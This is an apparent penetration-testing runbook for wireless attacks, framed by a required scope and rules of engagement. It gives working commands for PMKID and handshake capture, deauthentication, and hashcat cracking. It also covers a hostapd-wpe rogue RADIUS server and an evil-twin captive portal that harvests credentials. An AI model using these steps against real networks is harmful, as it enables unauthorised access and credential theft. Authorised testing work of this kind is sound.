# Runbook: Wireless attacks

## Objective

Obtain network access or credentials through wireless vulnerabilities. Scope must explicitly include wireless testing and specify whether the attacker is assumed to be in radio range of the target.

## Prerequisites

- Wireless adapter capable of monitor mode and packet injection (Alfa AWUS036ACH or equivalent).
- Kali Linux or similar with aircrack-ng suite, hcxdumptool, hcxtools, and hostapd-wpe.
- Rule of engagement confirmation that deauthentication frames and active association attempts are permitted.

## Phase 1: Survey

Identify target networks and nearby clients:

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
```

Record for each target network: BSSID, channel, ESSID, encryption type (WPA2/WPA3/WPA2-Enterprise), and any associated client MAC addresses.

## Phase 2: WPA2 personal (PMKID attack)

Attempt PMKID capture first, as it requires no connected clients:

```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 --filtermode=2 --filterlist=<BSSID>
hcxpcapngtool -o hash.22000 pmkid.pcapng
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

If PMKID is not recovered, capture a four-way handshake:

```bash
# Focus on target AP and channel
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Deauthenticate a connected client to force reconnect (in a separate terminal)
aireplay-ng -0 5 -a <BSSID> -c <client-MAC> wlan0mon

# Crack the captured handshake
hashcat -m 22000 capture.22000 /usr/share/wordlists/rockyou.txt
```

## Phase 3: WPA2-Enterprise (PEAP credential capture)

Set up a rogue RADIUS server that accepts any credentials:

```bash
# Configure hostapd-wpe with target SSID and WPA2-Enterprise settings
# Edit /etc/hostapd-wpe/hostapd-wpe.conf:
#   ssid=<target-SSID>
#   channel=<target-channel>

hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

Clients that do not validate the RADIUS server certificate will authenticate, delivering MSCHAPv2 challenge-response hashes. These are written to `/var/log/hostapd-wpe.log`.

Crack captured MSCHAPv2 hashes:

```bash
hashcat -m 5500 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Phase 4: Evil twin and captive portal

For credentials or session tokens from clients that associate with the rogue network:

```bash
# Create soft AP with same SSID as target, stronger signal on same channel
hostapd evil-twin.conf

# Configure DHCP
dnsmasq -C dnsmasq.conf

# Serve credential harvesting page
# Redirect all HTTP to captive portal, intercept credentials
```

The rogue AP should broadcast the same SSID on the same channel with higher transmission power. WPA2 clients will prefer a higher-signal network with the correct SSID.

## Phase 5: Results handling

For recovered WPA2 passphrases: test access and document network access level obtained.

For captured NTLM hashes: attempt offline cracking and note any successful domain credential recovery.

For captured plaintext credentials from captive portal: test each against the target application and VPN endpoints.

Document: networks surveyed, attack technique used, credentials or access obtained, network segment accessible from the recovered access.
